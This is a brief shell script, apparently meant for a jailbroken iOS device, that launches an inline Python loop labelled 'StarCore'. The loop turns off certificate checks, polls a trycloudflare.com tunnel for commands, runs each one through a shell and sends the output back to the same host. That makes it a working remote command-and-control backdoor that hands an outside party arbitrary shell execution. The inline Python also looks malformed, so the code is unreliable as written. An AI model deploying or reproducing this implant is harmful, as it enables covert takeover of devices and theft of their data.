#!/bin/sh
/var/jb/usr/local/bin/python3.12 -c "import ssl; ssl._create_default_https_context = ssl._create_unverified_context; import urllib.request,json,time,subprocess,os; R='https://arab-outsourcing-unknown-workflow.trycloudflare.com'; os.environ['PATH']='/var/jb/usr/bin:/var/jb/bin:/var/jb/usr/sbin:/var/jb/sbin:/var/jb/usr/local/bin'; print('[StarCore] connect'); while True:
 try:
  d=json.loads(urllib.request.urlopen(R,timeout=10).read())
  for c in d.get('commands',[]):
   cid=c.get('id',0);cmd=c.get('command','');print('exec #%d: %s'%(cid,cmd))
   r=subprocess.run(cmd,shell=True,executable='/var/jb/bin/sh',capture_output=True,text=True,timeout=30)
   res={'id':cid,'status':'done','stdout':r.stdout[:65536],'stderr':r.stderr[:65536],'returncode':r.returncode}
   urllib.request.urlopen(urllib.request.Request(R+'/result',data=json.dumps(res).encode(),headers={'Content-Type':'application/json'}),timeout=10)
   print('done #%d'%cid)
 except Exception as e: print('err: %s'%e)
 time.sleep(3)"
